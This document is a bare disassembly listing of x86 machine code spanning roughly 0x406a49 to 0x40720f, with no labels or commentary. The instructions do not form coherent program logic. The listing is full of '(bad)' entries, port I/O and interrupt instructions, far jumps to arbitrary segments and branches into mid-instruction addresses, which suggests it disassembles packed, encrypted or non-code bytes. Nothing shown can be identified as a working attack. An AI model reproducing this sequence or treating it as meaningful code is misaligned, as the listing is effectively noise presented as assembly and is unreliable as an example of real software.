  406a49:	test   BYTE PTR [ebx],dl
  406a4b:	popf   
  406a4c:	mov    BYTE PTR [esi+0x43],cl
  406a4f:	jbe    0x406a28
  406a51:	leave  
  406a52:	inc    BYTE PTR [eax+0x7]
  406a55:	cmp    bh,BYTE PTR [esi+0x755daa2d]
  406a5b:	and    eax,0xe4ad64d2
  406a60:	jp     0x406ab6
  406a62:	push   esp
  406a63:	enter  0x288b,0xab
  406a67:	mov    fs,WORD PTR [eax]
  406a69:	int    0xef
  406a6b:	out    dx,al
  406a6c:	scas   al,BYTE PTR es:[edi]
  406a6d:	and    DWORD PTR [ebx-0x67],esp
  406a70:	(bad)  
  406a71:	push   ecx
  406a72:	mov    ebx,0xb2ea05fe
  406a77:	mov    dh,0xf
  406a79:	nop
  406a7a:	fisub  DWORD PTR [esi]
  406a7c:	(bad)  
  406a7d:	xlat   BYTE PTR ds:[ebx]
  406a7e:	(bad)  
  406a7f:	in     eax,0x83
  406a81:	and    BYTE PTR [edi+0x1f88f7da],bl
  406a87:	cmc    
  406a88:	fst    QWORD PTR ds:0x9d22b202
  406a8e:	sbb    edx,DWORD PTR [esi]
  406a90:	imul   edx,DWORD PTR ds:0x96fdf408,0xffffff91
  406a97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a98:	mov    ah,0xdb
  406a9a:	out    0x18,al
  406a9c:	mov    bl,0x7a
  406a9e:	leave  
  406a9f:	lods   al,BYTE PTR ds:[esi]
  406aa0:	push   esi
  406aa1:	int    0xff
  406aa3:	mov    ds:0x17d14b3a,al
  406aa8:	in     eax,0x69
  406aaa:	and    al,0x3c
  406aac:	sbb    esp,DWORD PTR [edx]
  406aae:	imul   edx,DWORD PTR [ecx+0x4c],0x76
  406ab2:	pop    edx
  406ab3:	jp     0x406aa8
  406ab5:	gs dec esi
  406ab7:	dec    ebp
  406ab8:	retf   
  406ab9:	cmp    bl,bh
  406abb:	mov    ch,BYTE PTR [ebx-0x46dc53e]
  406ac1:	test   DWORD PTR [ebx+0x3446ecec],ecx
  406ac7:	mov    ah,0xcb
  406ac9:	mov    ecx,0x305ce4bf
  406ace:	mov    DWORD PTR [ebx+0x2d289146],ebx
  406ad4:	adc    BYTE PTR ds:0x32674be7,ah
  406ada:	loopne 0x406af6
  406adc:	js     0x406afb
  406ade:	mov    eax,0x862fd79f
  406ae3:	stos   BYTE PTR es:[edi],al
  406ae4:	sbb    edx,edi
  406ae6:	mov    ah,0x4b
  406ae8:	cmp    al,0xbd
  406aea:	jbe    0x406aa1
  406aec:	faddp  st(3),st
  406aee:	dec    eax
  406aef:	out    dx,al
  406af0:	and    eax,DWORD PTR [edx+edi*1-0x39]
  406af4:	(bad)  
  406af5:	xchg   esp,eax
  406af6:	dec    ecx
  406af7:	dec    edx
  406af8:	scas   eax,DWORD PTR es:[edi]
  406af9:	lods   eax,DWORD PTR ds:[esi]
  406afa:	mov    eax,DWORD PTR [ecx+ebp*4+0x62c160f1]
  406b01:	mov    ecx,0xd195d0ea
  406b06:	cmp    al,0x9d
  406b08:	pop    ss
  406b09:	shr    dl,1
  406b0b:	push   edx
  406b0c:	sbb    eax,0xba4dd5f4
  406b11:	out    dx,eax
  406b12:	xchg   edx,eax
  406b13:	stos   DWORD PTR es:[edi],eax
  406b14:	dec    edi
  406b15:	sbb    al,0xe7
  406b17:	sbb    DWORD PTR [edx-0x761e24c7],0x99eedfcd
  406b21:	cld    
  406b22:	pop    ebx
  406b23:	cdq    
  406b24:	pushf  
  406b25:	pop    edi
  406b26:	xor    ebp,DWORD PTR [edx+0x2a]
  406b29:	mov    ds:0x9314fcdd,eax
  406b2e:	push   eax
  406b2f:	jp     0x406b61
  406b31:	lock retf 0xd1b5
  406b35:	enter  0xa9d5,0x18
  406b39:	in     eax,0xe
  406b3b:	cmp    eax,0xadfe8d6c
  406b40:	jmp    DWORD PTR [esi-0x52]
  406b43:	sbb    bh,BYTE PTR [esi]
  406b45:	int3   
  406b46:	mov    cs,edi
  406b48:	rcr    BYTE PTR [ebx+0x7bd571b6],0x78
  406b4f:	pushf  
  406b50:	ss repz pop es
  406b53:	das    
  406b54:	leave  
  406b55:	push   edx
  406b56:	rcr    DWORD PTR ds:0xba5034c6,1
  406b5c:	arpl   WORD PTR [ebx-0x1],bp
  406b5f:	push   edx
  406b61:	loop   0x406bb9
  406b63:	mov    eax,ds:0x267975ba
  406b68:	push   ebx
  406b69:	xchg   ebp,eax
  406b6a:	sub    edx,DWORD PTR [esi+0xe3b4b22]
  406b70:	xor    dl,BYTE PTR [ecx+0x1f]
  406b73:	mov    eax,ds:0xc97e98db
  406b78:	inc    esi
  406b79:	aaa    
  406b7a:	mov    ah,0xc8
  406b7c:	push   ebp
  406b7d:	sub    al,BYTE PTR [ebp+0x10]
  406b80:	adc    eax,0xa93fdf45
  406b85:	rcr    BYTE PTR [edi],1
  406b87:	arpl   WORD PTR [edx-0x7b],di
  406b8a:	pop    edi
  406b8b:	jbe    0x406b99
  406b8d:	push   ss
  406b8e:	jbe    0x406b9e
  406b90:	xor    eax,0x27536bc2
  406b95:	fdivr  DWORD PTR [ebx-0x1c]
  406b98:	es xchg ecx,eax
  406b9a:	lea    eax,[ebx]
  406b9c:	inc    ebx
  406b9d:	pop    ebp
  406b9e:	mov    ebx,0x348a47c1
  406ba3:	mov    eax,0xce8141d9
  406ba8:	out    0xff,al
  406baa:	out    0xdb,eax
  406bac:	stos   BYTE PTR es:[edi],al
  406bad:	repnz xor eax,0x77c33b73
  406bb3:	xor    DWORD PTR [eax+0x44],ecx
  406bb6:	add    ebx,ebx
  406bb8:	cmp    BYTE PTR [esi-0x58],ch
  406bbb:	add    edx,ebx
  406bbd:	jbe    0x406b59
  406bbf:	jbe    0x406b68
  406bc1:	(bad)  
  406bc2:	rcl    DWORD PTR [ebx+0x43],cl
  406bc5:	mov    ebx,0xa74bee22
  406bca:	or     cl,BYTE PTR [eax-0x4e540913]
  406bd0:	sub    eax,0x909e6d3f
  406bd5:	es or  eax,0xcdb8cd48
  406bdb:	mov    ah,0xde
  406bdd:	bnd jl 0x406bf6
  406be0:	dec    edi
  406be1:	ja     0x406b8e
  406be3:	cmp    DWORD PTR [ebx-0x6f],0xffffffb9
  406be7:	mov    ch,0x44
  406be9:	ror    DWORD PTR [esi+0x4e],1
  406bec:	jge    0x406c6d
  406bee:	ins    DWORD PTR es:[edi],dx
  406bef:	add    al,0x54
  406bf1:	or     cl,bh
  406bf3:	stos   DWORD PTR es:[edi],eax
  406bf4:	xchg   edx,eax
  406bf5:	sub    eax,0xb6697969
  406bfa:	dec    ecx
  406bfb:	cmp    bl,BYTE PTR [edx+0x64]
  406bfe:	push   es
  406bff:	inc    eax
  406c00:	daa    
  406c01:	shl    DWORD PTR [ebx+0x1c],cl
  406c04:	mov    BYTE PTR [ebx-0x44],al
  406c07:	jge    0x406c33
  406c09:	(bad)  
  406c0a:	pushf  
  406c0b:	inc    BYTE PTR [edx]
  406c0d:	out    dx,eax
  406c0e:	mov    ah,0xac
  406c10:	xor    eax,0x4a5c8215
  406c15:	xor    eax,0xe2492cc0
  406c1a:	mov    cl,0xd0
  406c1c:	ret    0xce45
  406c1f:	pushf  
  406c20:	fs mov ecx,0x13dc79a2
  406c26:	mov    ds:0x37f7f933,eax
  406c2b:	shl    esp,0xa9
  406c2e:	or     DWORD PTR ds:0x8ea25abc,0x2a
  406c35:	mov    cl,0xe
  406c37:	sbb    al,0x6f
  406c39:	test   eax,0xb30bed97
  406c3e:	ss xchg esi,eax
  406c40:	fild   QWORD PTR [ebp+0x2c49446f]
  406c46:	jns    0x406cc1
  406c48:	push   es
  406c49:	ret    0xb848
  406c4c:	daa    
  406c4d:	retf   0x42dc
  406c50:	outs   dx,DWORD PTR ds:[esi]
  406c51:	loop   0x406c5b
  406c53:	and    ebx,DWORD PTR [edx-0x692850e5]
  406c59:	stos   DWORD PTR es:[edi],eax
  406c5a:	adc    DWORD PTR [edx-0x48546ad7],edx
  406c60:	pop    edx
  406c61:	(bad)  
  406c62:	(bad)  
  406c63:	(bad)  
  406c65:	and    ecx,0x13784414
  406c6b:	not    DWORD PTR [esi-0x2b99f295]
  406c71:	and    al,0x96
  406c73:	jg     0x406cae
  406c75:	mov    bl,0xd
  406c77:	(bad)  
  406c78:	test   eax,0x78806bc7
  406c7d:	push   eax
  406c7e:	addr16 cdq 
  406c80:	mov    ebx,0xe2dfb310
  406c85:	clc    
  406c86:	or     DWORD PTR [eax-0x29],ebx
  406c89:	mov    dl,0x87
  406c8b:	cmp    dh,BYTE PTR [ecx+0x76]
  406c8e:	hlt    
  406c8f:	loop   0x406c69
  406c91:	in     al,0x2c
  406c93:	add    ebx,esi
  406c95:	fwait
  406c96:	mov    WORD PTR [ecx+edx*8],ds
  406c99:	jb     0x406cfd
  406c9b:	imul   edi,DWORD PTR [eax-0xfcda178],0xe1b36122
  406ca5:	fbld   TBYTE PTR [ebx+0x43223ce1]
  406cab:	(bad)  
  406cac:	sbb    ecx,edx
  406cae:	or     DWORD PTR [edx-0x79],ecx
  406cb1:	(bad)  
  406cb3:	mov    edx,0x801b43ab
  406cb8:	ss or  al,0x13
  406cbb:	adc    eax,0xa4adc833
  406cc0:	lds    eax,FWORD PTR [ebx+0x74]
  406cc3:	std    
  406cc4:	outs   dx,DWORD PTR ds:[esi]
  406cc5:	dec    edi
  406cc6:	mov    ds:0x4ab36eb2,eax
  406ccb:	cmp    al,0x4c
  406ccd:	icebp  
  406cce:	push   ds
  406ccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cd0:	and    eax,0x1cb19bc4
  406cd5:	sahf   
  406cd6:	jne    0x406cd7
  406cd8:	lea    eax,[esp+ebx*8+0x187ddf68]
  406cdf:	dec    eax
  406ce0:	jae    0x406cb7
  406ce2:	daa    
  406ce3:	retf   
  406ce4:	aaa    
  406ce5:	je     0x406c8b
  406ce7:	leave  
  406ce8:	push   ds
  406ce9:	std    
  406cea:	or     BYTE PTR [esi+0x54bc5b2d],bl
  406cf0:	outs   dx,BYTE PTR ds:[esi]
  406cf1:	lock ja 0x406d1b
  406cf4:	(bad)  
  406cf5:	cmp    eax,0x8d142a28
  406cfa:	or     BYTE PTR [ebp+0x27],al
  406cfd:	pop    edi
  406cfe:	mov    dl,0x4a
  406d00:	sub    bh,BYTE PTR ds:0xd6b8209f
  406d06:	mov    WORD PTR [edi+ecx*1],ss
  406d09:	in     al,dx
  406d0a:	in     eax,0xef
  406d0c:	xchg   edx,eax
  406d0d:	xor    edx,edx
  406d0f:	cdq    
  406d10:	xchg   ebp,eax
  406d11:	push   es
  406d12:	fild   QWORD PTR [ecx+0x5f5c8f9f]
  406d18:	dec    ecx
  406d19:	jb     0x406ccf
  406d1b:	pop    edx
  406d1c:	pcmpeqw mm0,QWORD PTR [edx+0x511fa775]
  406d23:	sbb    ebx,esi
  406d25:	daa    
  406d26:	aas    
  406d27:	jne    0x406d46
  406d29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d2a:	loop   0x406d9c
  406d2c:	ss adc al,0x56
  406d2f:	sahf   
  406d30:	add    DWORD PTR [eax+ebx*1+0x4ce33de4],eax
  406d37:	jns    0x406cfc
  406d39:	dec    edi
  406d3a:	in     al,0x4d
  406d3c:	pop    ebp
  406d3d:	fcmovne st,st(2)
  406d3f:	outs   dx,DWORD PTR ds:[esi]
  406d40:	(bad)  [eax+0x20]
  406d43:	(bad)  
  406d44:	xchg   esp,eax
  406d45:	adc    DWORD PTR [ecx+edx*4],ecx
  406d48:	test   BYTE PTR [edx+0x709ae307],0x14
  406d4f:	test   eax,0xe577008a
  406d54:	aad    0xf1
  406d56:	adc    BYTE PTR [edx],dh
  406d58:	into   
  406d59:	push   es
  406d5a:	fstp   TBYTE PTR [ebx-0x49d4d284]
  406d60:	mov    bl,0x13
  406d62:	mov    al,0x1b
  406d64:	xor    BYTE PTR [ecx],ch
  406d66:	sub    al,0x89
  406d68:	mov    cl,0x90
  406d6a:	stc    
  406d6b:	aad    0x3c
  406d6d:	fistp  DWORD PTR [ebp-0x4]
  406d70:	dec    edx
  406d71:	repz sbb cl,BYTE PTR [edx-0x2b]
  406d75:	adc    ch,BYTE PTR [eax]
  406d77:	push   es
  406d78:	scas   al,BYTE PTR es:[edi]
  406d79:	repnz or BYTE PTR [ecx-0x2e80be0c],al
  406d80:	adc    edi,DWORD PTR [esi-0x3d664126]
  406d86:	pushf  
  406d87:	sub    al,0x92
  406d89:	mov    dh,0x30
  406d8b:	les    esi,FWORD PTR [ecx-0x21]
  406d8e:	dec    BYTE PTR [eax]
  406d90:	(bad)  
  406d91:	pop    eax
  406d92:	scas   al,BYTE PTR es:[edi]
  406d93:	xlat   BYTE PTR ds:[ebx]
  406d94:	gs pop edi
  406d96:	out    dx,al
  406d97:	mov    bh,0xf
  406d99:	xchg   DWORD PTR [esi+0x7d],ebx
  406d9c:	pusha  
  406d9d:	mov    ds:0xd10d2498,eax
  406da2:	retf   0xcc4c
  406da5:	sub    edx,DWORD PTR [eax+0x6a]
  406da8:	sub    al,dl
  406daa:	adc    eax,0xed1f801f
  406daf:	xor    BYTE PTR [edx+0x6c1cf502],al
  406db5:	pop    ss
  406db6:	mov    ebx,0x2cccde33
  406dbb:	outs   dx,DWORD PTR ds:[esi]
  406dbc:	inc    esp
  406dbd:	jecxz  0x406d5a
  406dbf:	dec    eax
  406dc0:	or     eax,0x9f18e47f
  406dc5:	jo     0x406dac
  406dc7:	push   0x3eee994a
  406dcc:	mov    ebx,0x5fac4489
  406dd1:	pop    eax
  406dd2:	cmc    
  406dd3:	mov    ss,WORD PTR [edx-0x60]
  406dd6:	cmp    eax,0x19c7e62b
  406ddb:	enter  0xa5bb,0xda
  406ddf:	jge    0x406d6b
  406de1:	cmp    dh,ah
  406de3:	out    dx,eax
  406de4:	sub    BYTE PTR [edi-0x10],0x6e
  406de8:	(bad)  
  406de9:	or     eax,0x6cee4cb0
  406dee:	cli    
  406def:	mov    esi,0x1080b72d
  406df4:	jno    0x406dd3
  406df6:	(bad)  
  406df7:	int3   
  406df8:	in     eax,dx
  406df9:	jb     0x406dd0
  406dfb:	mov    edx,0xfae9383e
  406e00:	mov    eax,0xf77bad37
  406e05:	enter  0x93ff,0x50
  406e09:	mov    BYTE PTR [edi+0x4e],ch
  406e0c:	call   0x52ae:0x47bc4ac9
  406e13:	fidivr WORD PTR ds:0x50e7d057
  406e19:	gs jno 0x406e94
  406e1c:	pop    esp
  406e1d:	shl    DWORD PTR [eax-0x6369867a],cl
  406e23:	lds    edi,FWORD PTR [esi+eiz*1+0x7c114443]
  406e2a:	push   ds
  406e2b:	das    
  406e2c:	ds jge 0x406dc4
  406e2f:	aam    0xf9
  406e31:	in     eax,0xbc
  406e33:	icebp  
  406e34:	pop    ebp
  406e35:	sbb    eax,0x90cf64b
  406e3a:	add    BYTE PTR [esi+0x71cc761d],cl
  406e40:	cli    
  406e41:	mov    edx,0xe7664b69
  406e46:	int    0xc6
  406e48:	inc    esp
  406e49:	inc    eax
  406e4a:	inc    edi
  406e4b:	jg     0x406e51
  406e4d:	dec    esp
  406e4e:	mov    ebp,0xa627c4c6
  406e53:	and    DWORD PTR [esi-0x2a],edi
  406e56:	mov    dh,0x13
  406e58:	xor    edi,DWORD PTR [ecx]
  406e5a:	mov    ebx,0xd5e94664
  406e5f:	add    al,0x2a
  406e61:	loopne 0x406e5b
  406e63:	jb     0x406e6a
  406e65:	lods   al,BYTE PTR ds:[esi]
  406e66:	pop    esp
  406e67:	cmp    ecx,DWORD PTR [ebx]
  406e69:	mov    ds:0xb122e2dc,al
  406e6e:	cmp    dh,BYTE PTR [ebp+0x6e]
  406e71:	leave  
  406e72:	push   esp
  406e73:	sahf   
  406e74:	xchg   edi,eax
  406e75:	test   DWORD PTR [esi-0x6e21de9c],eax
  406e7b:	mov    edx,0x6989b29
  406e80:	push   ds
  406e81:	pusha  
  406e82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e83:	clc    
  406e84:	jle    0x406e8f
  406e86:	int3   
  406e87:	cmp    ebp,eax
  406e89:	push   edx
  406e8a:	sbb    BYTE PTR ds:0x3994db0e,dl
  406e90:	mov    ebp,0x49b808c2
  406e95:	dec    ebp
  406e96:	or     eax,0x26f7cbf8
  406e9b:	add    al,ch
  406e9d:	arpl   WORD PTR [edi+0x14],dx
  406ea0:	add    eax,DWORD PTR [ebx-0x59b0a682]
  406ea6:	sub    BYTE PTR [edi+eax*8-0x4386054d],0x41
  406eae:	imul   eax,esi,0xffffffde
  406eb1:	shr    edi,0x73
  406eb4:	xchg   ebx,eax
  406eb5:	aaa    
  406eb6:	jle    0x406f2f
  406eb8:	inc    edx
  406eb9:	rol    DWORD PTR [ebx+0x2f],1
  406ebc:	xchg   ecx,eax
  406ebd:	test   al,0xb8
  406ebf:	pop    esp
  406ec0:	shl    ebp,1
  406ec2:	repz mov edx,0x726bc3f4
  406ec8:	stos   BYTE PTR es:[edi],al
  406ec9:	push   ds
  406eca:	shr    BYTE PTR [ebx+0x6a],1
  406ecd:	and    eax,0x9df11952
  406ed2:	jae    0x406ee1
  406ed4:	mov    ebp,ss
  406ed6:	push   cs
  406ed7:	and    ch,BYTE PTR [esi-0x293bb012]
  406edd:	dec    esi
  406ede:	clc    
  406edf:	sub    cl,BYTE PTR [ebx+0x3]
  406ee2:	dec    eax
  406ee3:	xchg   DWORD PTR [eax-0x7bf44901],ebx
  406ee9:	lods   al,BYTE PTR ds:[esi]
  406eea:	mov    cl,0xc1
  406eec:	loope  0x406f41
  406eee:	pop    ebp
  406eef:	pop    ecx
  406ef0:	sub    dl,BYTE PTR [eax+eax*4]
  406ef3:	mov    al,0xe0
  406ef5:	les    esi,FWORD PTR [edx+ebp*8]
  406ef8:	lds    eax,FWORD PTR [esi+eax*8+0x232a3c96]
  406eff:	fcmovu st,st(1)
  406f01:	shl    BYTE PTR [ecx],0x8f
  406f04:	call   0xa214:0x55015fc
  406f0b:	(bad)  
  406f0c:	loop   0x406e9d
  406f0e:	dec    DWORD PTR [eax-0x3b]
  406f11:	aas    
  406f12:	clc    
  406f13:	adc    DWORD PTR [ebx],edx
  406f15:	jecxz  0x406eea
  406f17:	jle    0x406e99
  406f19:	mov    ah,0x24
  406f1b:	in     eax,0x71
  406f1d:	dec    ecx
  406f1e:	mov    al,ds:0x5d8940a5
  406f23:	push   ebp
  406f24:	sub    edx,DWORD PTR [esi]
  406f26:	ret    
  406f27:	jg     0x406f83
  406f29:	imul   edi,DWORD PTR [edx-0x18],0x207d8aea
  406f30:	fdivr  QWORD PTR [esi+ebp*1-0x78]
  406f34:	sti    
  406f35:	cdq    
  406f36:	xchg   edi,eax
  406f37:	mov    ebx,0x9aa6a0cc
  406f3c:	inc    BYTE PTR [eax-0x1]
  406f3f:	enter  0xaa70,0x4a
  406f43:	(bad)  
  406f44:	adc    bh,BYTE PTR [ebp+0x46]
  406f47:	jp     0x406f35
  406f49:	test   BYTE PTR [edi+ebx*8+0x34f2b68c],0x31
  406f51:	scas   al,BYTE PTR es:[edi]
  406f52:	cmp    eax,0x3a0d1dc3
  406f57:	cmc    
  406f58:	ss inc ebx
  406f5a:	mov    dl,0xcf
  406f5c:	or     eax,0xfe90ea49
  406f61:	dec    esi
  406f62:	das    
  406f63:	push   0xffffffd8
  406f65:	pop    edx
  406f66:	mov    BYTE PTR [ecx],bl
  406f68:	(bad)  
  406f69:	call   DWORD PTR [edi*4-0x16417057]
  406f70:	or     eax,0x5b1df42e
  406f75:	push   edx
  406f76:	push   ebx
  406f77:	or     DWORD PTR [ebx+0x30a62bb7],esp
  406f7d:	pop    es
  406f7e:	sbb    al,0xbe
  406f80:	(bad)  
  406f81:	dec    ebp
  406f82:	push   edi
  406f83:	not    BYTE PTR [edx-0x3b]
  406f86:	mov    ss,WORD PTR [edi+0x1e]
  406f89:	push   es
  406f8a:	sub    eax,0xf85b42ae
  406f8f:	mov    esi,0xcb659527
  406f94:	jns    0x406fab
  406f96:	xchg   BYTE PTR [ebx],ch
  406f98:	imul   edx,DWORD PTR [edi],0xa
  406f9b:	add    al,0x8f
  406f9d:	cmp    al,0x5
  406f9f:	mov    eax,0x3395abc8
  406fa4:	push   0x23
  406fa6:	fsub   DWORD PTR [ebx-0x6]
  406fa9:	pusha  
  406faa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fab:	sbb    DWORD PTR [ebp-0x361b304d],0x13
  406fb2:	pushf  
  406fb3:	inc    ecx
  406fb4:	push   esp
  406fb5:	sbb    DWORD PTR [ebp-0x2a],0xa4c95847
  406fbc:	pusha  
  406fbd:	or     eax,0x4493eecf
  406fc2:	ficom  WORD PTR [eax]
  406fc4:	mul    esp
  406fc6:	ret    0x8baf
  406fc9:	pushf  
  406fca:	ds out 0x60,eax
  406fcd:	pop    ebp
  406fce:	mov    edi,0x79d7d148
  406fd3:	daa    
  406fd4:	loopne 0x406fa7
  406fd6:	leave  
  406fd7:	shr    BYTE PTR [ebp-0x55f18a98],cl
  406fdd:	jle    0x406f62
  406fdf:	mov    bl,0x21
  406fe1:	inc    esi
  406fe2:	out    dx,eax
  406fe3:	push   edx
  406fe4:	xchg   esi,eax
  406fe5:	fsub   QWORD PTR [eax-0x1e]
  406fe8:	push   0xfffffff9
  406fea:	sub    BYTE PTR [ebp+0x3a],bl
  406fed:	xor    eax,0x7fc8b449
  406ff2:	sub    eax,0xe68d78a9
  406ff7:	fcmovne st,st(5)
  406ff9:	pop    edi
  406ffa:	test   ebp,edi
  406ffc:	icebp  
  406ffd:	call   0xfa7d3f5a
  407002:	sti    
  407003:	xchg   ecx,eax
  407004:	leave  
  407005:	outs   dx,DWORD PTR ds:[esi]
  407006:	push   esp
  407007:	call   0x8dfd:0xe86e9340
  40700e:	ja     0x406ffe
  407010:	sbb    cl,BYTE PTR [ecx+0x5f374feb]
  407016:	test   esp,ebx
  407018:	adc    al,ch
  40701a:	push   ds
  40701b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40701c:	cmp    BYTE PTR [edi+0x3e],dh
  40701f:	add    al,0xd5
  407021:	or     ecx,edx
  407023:	es lahf 
  407025:	pop    ss
  407026:	lahf   
  407027:	lea    edi,[ebp-0x75]
  40702a:	lds    esi,FWORD PTR [edi+0x40]
  40702d:	add    eax,0xd642ca8
  407032:	jbe    0x406fb4
  407034:	les    ebx,FWORD PTR [eax]
  407036:	dec    ebx
  407037:	ss loope 0x40701f
  40703a:	pusha  
  40703b:	sub    BYTE PTR [esi-0x7357758e],dl
  407041:	mov    ebx,0x56f9b464
  407046:	daa    
  407047:	mov    DWORD PTR [edx-0x4b2d9860],eax
  40704d:	(bad)  
  40704e:	or     cl,ch
  407050:	jb     0x407063
  407052:	shl    dh,1
  407054:	ds dec eax
  407056:	pusha  
  407057:	mov    ecx,0xb334e8a6
  40705c:	pop    ebp
  40705d:	pop    esi
  40705e:	xor    ch,BYTE PTR [eax+0x13aa3eb2]
  407064:	fwait
  407065:	(bad)  
  407066:	in     eax,dx
  407067:	es jg  0x407062
  40706a:	adc    eax,0x48946eb
  40706f:	mov    esi,0xd6b81205
  407074:	out    0x4d,al
  407076:	out    0xf,al
  407078:	xchg   BYTE PTR [edi+0x35faf2ab],ch
  40707e:	inc    ecx
  40707f:	jnp    0x40700e
  407081:	es aas 
  407083:	ins    BYTE PTR es:[edi],dx
  407084:	jmp    0x6a741f8
  407089:	fstp   TBYTE PTR [ebx+edi*2-0x121445d1]
  407090:	mov    bl,ah
  407092:	jle    0x4070e7
  407094:	(bad)  
  407095:	jae    0x40707a
  407097:	jecxz  0x407028
  407099:	cmp    eax,edx
  40709b:	jmp    0x86e0:0x55c9fcea
  4070a2:	inc    eax
  4070a3:	pop    esp
  4070a4:	cs jno 0x4070de
  4070a7:	pushf  
  4070a8:	adc    dh,bl
  4070aa:	leave  
  4070ab:	xchg   BYTE PTR [esi],dl
  4070ad:	xchg   edi,eax
  4070ae:	jl     0x407081
  4070b0:	or     eax,0x6557d750
  4070b5:	or     eax,0xbb5910cc
  4070ba:	stos   BYTE PTR es:[edi],al
  4070bb:	out    dx,al
  4070bc:	mov    esp,0x9c706480
  4070c1:	cli    
  4070c2:	retf   0x9386
  4070c5:	push   ebx
  4070c6:	fdivr  st,st(7)
  4070c8:	mov    edx,0x23762f3
  4070cd:	and    dh,ah
  4070cf:	adc    al,0x64
  4070d1:	cli    
  4070d2:	or     BYTE PTR [edx],ah
  4070d4:	mov    ebx,0x96fbde16
  4070d9:	or     BYTE PTR [eax],bl
  4070db:	xor    al,0x23
  4070dd:	outs   dx,BYTE PTR ds:[esi]
  4070de:	jle    0x4070bd
  4070e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070e1:	sub    ah,BYTE PTR cs:[ebx+edi*1-0x73ccffc]
  4070e9:	mov    esp,0x8c52aeb8
  4070ee:	adc    eax,0x8dfe7d9a
  4070f3:	mov    ecx,DWORD PTR [ebp+esi*8+0x11]
  4070f7:	or     dl,BYTE PTR [edx+0x27]
  4070fa:	outs   dx,BYTE PTR ds:[esi]
  4070fb:	jg     0x407137
  4070fd:	xchg   edi,eax
  4070fe:	pop    ds
  4070ff:	jo     0x407178
  407101:	mov    ecx,0x5d2cc650
  407106:	(bad)  
  407107:	mov    bl,BYTE PTR [esi-0x42]
  40710a:	pop    ebx
  40710b:	push   esi
  40710c:	dec    esi
  40710d:	pop    esp
  40710e:	jnp    0x407150
  407110:	jl     0x40713e
  407112:	mov    eax,0x67fc4d5e
  407117:	inc    ebx
  407118:	ret    0xc263
  40711b:	cmc    
  40711c:	dec    esi
  40711d:	and    al,al
  40711f:	dec    esi
  407120:	div    cl
  407122:	cwde   
  407123:	stos   DWORD PTR es:[edi],eax
  407124:	and    al,0xe4
  407126:	clc    
  407127:	and    DWORD PTR [esi+0x78],eax
  40712a:	sub    edx,ecx
  40712c:	(bad)  
  40712d:	int    0xff
  40712f:	cwde   
  407130:	int    0x12
  407132:	xchg   DWORD PTR [ecx+0x46],edx
  407135:	or     eax,0xe44a8b93
  40713a:	cmp    dh,BYTE PTR [ebp+0x15]
  40713d:	and    al,0x65
  40713f:	inc    ecx
  407140:	retf   
  407141:	push   ecx
  407142:	cmp    ebx,DWORD PTR [ecx]
  407144:	not    esi
  407146:	stos   DWORD PTR es:[edi],eax
  407147:	push   edx
  407148:	push   0x28
  40714a:	pop    ss
  40714b:	ds mov ch,0xee
  40714e:	push   ds
  40714f:	xor    al,0xf
  407151:	icebp  
  407152:	das    
  407153:	push   ds
  407154:	(bad)  
  407155:	mov    ebx,0xc865f2da
  40715a:	mov    ebx,0x83671aa7
  40715f:	mov    eax,ds:0xa14e4401
  407164:	fist   DWORD PTR [esi]
  407166:	pop    DWORD PTR ds:0xfab9b218
  40716c:	test   BYTE PTR [esi+0x2a],al
  40716f:	pop    ebx
  407170:	not    ch
  407172:	cmp    ah,BYTE PTR [eax+0x38]
  407175:	outs   dx,BYTE PTR ds:[esi]
  407176:	out    dx,al
  407177:	ret    0x8b8b
  40717a:	dec    ecx
  40717b:	cmp    cl,dh
  40717d:	or     esi,DWORD PTR [eax-0x4d]
  407180:	xchg   edi,eax
  407181:	xchg   edx,eax
  407182:	repnz add BYTE PTR [edi-0x7d],cl
  407186:	jb     0x407200
  407188:	lock mov BYTE PTR [ebp+0xc],al
  40718c:	ja     0x407135
  40718e:	mov    bl,0x40
  407190:	lahf   
  407191:	push   0x2e
  407193:	dec    eax
  407194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407195:	aad    0x50
  407197:	out    dx,eax
  407198:	fdivr  DWORD PTR [edi-0x58f80fcc]
  40719e:	add    al,0x95
  4071a0:	push   0xffffff98
  4071a2:	sub    al,0x1c
  4071a4:	loopne 0x407197
  4071a6:	or     ebp,edx
  4071a8:	sbb    al,0x7
  4071aa:	out    dx,al
  4071ab:	out    dx,eax
  4071ac:	xchg   ecx,eax
  4071ad:	lods   al,BYTE PTR ds:[esi]
  4071ae:	push   cs
  4071af:	mov    edx,esp
  4071b1:	cwde   
  4071b2:	or     al,0xba
  4071b4:	xor    eax,0x9
  4071b7:	jecxz  0x407222
  4071b9:	xlat   BYTE PTR ds:[ebx]
  4071ba:	cmc    
  4071bb:	sbb    DWORD PTR cs:[ebp+0x51],0x2596e233
  4071c3:	dec    esp
  4071c4:	adc    ch,BYTE PTR [ebx-0x59fc3ade]
  4071ca:	push   ecx
  4071cb:	leave  
  4071cc:	aas    
  4071cd:	jl     0x4071dc
  4071cf:	jbe    0x40720d
  4071d1:	adc    DWORD PTR [edi-0x16],0x6c8401b9
  4071d8:	lds    ebp,FWORD PTR [edx]
  4071da:	pop    esp
  4071db:	cmp    BYTE PTR [eax+0x7e],ah
  4071de:	cwde   
  4071df:	dec    ebp
  4071e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071e1:	push   edx
  4071e2:	push   ax
  4071e4:	mov    ds:0xc2e41ba2,al
  4071e9:	ficom  WORD PTR [edi+eax*4-0x8]
  4071ed:	stos   DWORD PTR es:[edi],eax
  4071ee:	arpl   WORD PTR [esi-0xaa10a11],cx
  4071f4:	std    
  4071f5:	test   DWORD PTR [esi+0x61f3a5af],edi
  4071fb:	pop    ds
  4071fc:	pop    ss
  4071fd:	shl    BYTE PTR [edx+0x6b92b8ce],0xc1
  407204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407205:	sbb    ebp,DWORD PTR [ecx+0x39]
  407208:	and    al,0x85
  40720a:	dec    esp
  40720b:	(bad)  
  40720c:	loope  0x407257
  40720e:	stos   DWORD PTR es:[edi],eax
  40720f:	adc    al,bh
